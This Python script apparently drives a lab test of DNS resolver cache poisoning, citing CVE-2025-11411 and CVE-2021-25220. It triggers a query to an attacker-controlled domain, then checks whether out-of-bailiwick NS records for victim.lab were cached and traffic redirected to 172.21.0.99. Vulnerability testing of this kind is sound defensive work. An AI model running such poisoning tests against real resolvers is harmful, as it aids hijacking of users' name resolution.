#!/usr/bin/env python3
"""
Cache poisoning verification — Authority NS RDATA bailiwick check.

Runs automatically: baseline → trigger attack → wait → detect poisoning → second check.

Security question under test: does the resolver apply a bailiwick check to NS records
in the Authority section of an otherwise legitimate response? If a response for
attacker.lab carries NS records for victim.lab, does the resolver refuse to cache them?

See: CVE-2025-11411 (Unbound), CVE-2021-25220 (BIND9)
"""

import argparse
import sys
import time

import dns.message
import dns.name
import dns.query
import dns.rdatatype


def query_dns(server: str, port: int, qname: str, rdtype: str, timeout: float = 5.0):
    """Send a DNS query and return the full response object."""
    q = dns.message.make_query(qname, rdtype)
    try:
        resp = dns.query.udp(q, server, port=port, timeout=timeout)
        return resp
    except dns.exception.Timeout:
        return None
    except Exception as e:
        print(f"  [query error] {e}")
        return None


def extract_answer_ips(resp) -> list:
    """Extract all A record IPs from the Answer section."""
    ips = []
    if resp is None:
        return ips
    for rrset in resp.answer:
        if rrset.rdtype == dns.rdatatype.A:
            for rr in rrset:
                ips.append(str(rr))
    return ips


def extract_ns_names(resp) -> list:
    """Extract NSDNAME from all NS records in Answer and Authority."""
    ns_list = []
    if resp is None:
        return ns_list
    for section in [resp.answer, resp.authority]:
        for rrset in section:
            if rrset.rdtype == dns.rdatatype.NS:
                for rr in rrset:
                    ns_list.append((str(rrset.name), str(rr.target)))
    return ns_list


def check_all_sections_for_evil(resp) -> list:
    """Search Answer / Authority / Additional for malicious-looking records."""
    evil = []
    if resp is None:
        return evil
    for tag, section in [("ANSWER", resp.answer), ("AUTHORITY", resp.authority), ("ADDITIONAL", resp.additional)]:
        for rrset in section:
            for rr in rrset:
                rr_text = rr.to_text()
                if "evil" in rr_text.lower() or "172.21.0.99" in rr_text:
                    evil.append(f"{tag}: {rrset.name} {dns.rdatatype.to_text(rrset.rdtype)} {rr_text}")
    return evil


def main():
    parser = argparse.ArgumentParser(description="DNS cache poisoning check — bailiwick test")
    parser.add_argument("--target-ip", required=True, help="Resolver under test (IP)")
    parser.add_argument("--target-port", type=int, required=True, help="Resolver under test (port)")
    parser.add_argument("--target-name", required=True, help="Software name for the resolver under test")
    parser.add_argument("--wait", type=float, default=2.0, help="Seconds to wait after trigger before detection")
    args = parser.parse_args()

    srv = args.target_ip
    port = args.target_port
    name = args.target_name

    print(f"\n{'='*60}")
    print(f"  DNS cache poisoning test — {name}")
    print(f"  Target: {srv}:{port}")
    print(f"  Attack: out-of-bailiwick Authority NS in a legitimate response")
    print(f"{'='*60}\n")

    vulnerable = False

    # ── Step 1: Baseline ──
    print("[Step 1] Baseline: query www.victim.lab A")
    resp = query_dns(srv, port, "www.victim.lab", "A")
    if resp is None:
        print("  → Timeout, no response")
        print("  ✗ Baseline failed; cannot continue")
        return False

    ips = extract_answer_ips(resp)
    if "1.2.3.4" in ips:
        print(f"  → {', '.join(ips)} ✓ (expected)")
    else:
        print(f"  → {', '.join(ips) or 'no results'}")
        print("  ⚠ Baseline unexpected (want 1.2.3.4); try flushing cache and retry")

    # ── Step 2: Trigger ──
    print(f"\n[Step 2] Trigger: query test.attacker.lab A")
    print(f"  (Forwarded to the malicious authoritative server; response includes bogus victim.lab NS)")
    resp = query_dns(srv, port, "test.attacker.lab", "A")
    if resp is None:
        print("  → Timeout; malicious server may be down or unreachable")
        print("  ✗ Cannot trigger attack; aborting")
        return False

    ips = extract_answer_ips(resp)
    print(f"  → Answer: {', '.join(ips) or 'none'}")

    evil_in_trigger = check_all_sections_for_evil(resp)
    if evil_in_trigger:
        print(f"  → ⚠ Malicious records appear directly in the trigger response:")
        for e in evil_in_trigger:
            print(f"    {e}")
    else:
        print(f"  → No malicious records visible in trigger response (may have been filtered)")

    # ── Step 3: Wait ──
    print(f"\n[Step 3] Waiting {args.wait} s for cache effects...")
    time.sleep(args.wait)

    # ── Step 4: Detect NS poisoning ──
    print(f"\n[Step 4] Detect: query victim.lab NS")
    resp = query_dns(srv, port, "victim.lab", "NS")
    if resp is None:
        print("  → Timeout")
    else:
        ns_records = extract_ns_names(resp)
        if ns_records:
            for owner, target in ns_records:
                marker = " ⚠ OUT-OF-BAILIWICK — cache poisoned!" if "evil" in target.lower() else ""
                print(f"  → {owner} NS {target}{marker}")
                if "evil" in target.lower():
                    vulnerable = True
        else:
            print(f"  → No NS records returned")

        evil_here = check_all_sections_for_evil(resp)
        for e in evil_here:
            if "evil" in e.lower():
                print(f"  → ⚠ Malicious data: {e}")
                vulnerable = True

    # ── Step 5: Second verification ──
    print(f"\n[Step 5] Verify: query www.victim.lab A again")
    resp = query_dns(srv, port, "www.victim.lab", "A")
    if resp is None:
        print("  → Timeout (NS may point at non-existent servers)")
        if vulnerable:
            print("  → ⚠ Together with Step 4, this may indicate hijacked resolution")
    else:
        ips = extract_answer_ips(resp)
        rcode_text = dns.rcode.to_text(resp.rcode())
        print(f"  → {', '.join(ips) or f'no A records (RCODE={rcode_text})'}")
        if "172.21.0.99" in ips:
            print(f"  → ⚠ Traffic redirected to attacker IP!")
            vulnerable = True
        elif "1.2.3.4" in ips:
            print(f"  → ✓ Resolution looks normal; not hijacked")
        elif not ips and rcode_text == "SERVFAIL":
            if vulnerable:
                print(f"  → ⚠ SERVFAIL may be due to NS pointing at unreachable addresses")

    # ── Conclusion ──
    print(f"\n{'='*60}")
    if vulnerable:
        print(f"  ⚠ Conclusion: {name} is VULNERABLE")
        print(f"  Authority-NS-RDATA cache poisoning confirmed.")
        print(f"  The resolver did not enforce bailiwick checks correctly and cached")
        print(f"  out-of-bailiwick malicious NS records.")
    else:
        print(f"  ✓ Conclusion: {name} is NOT VULNERABLE")
        print(f"  The resolver correctly rejected out-of-bailiwick Authority NS records.")
    print(f"{'='*60}\n")

    return vulnerable


if __name__ == "__main__":
    result = main()
    sys.exit(1 if result else 0)
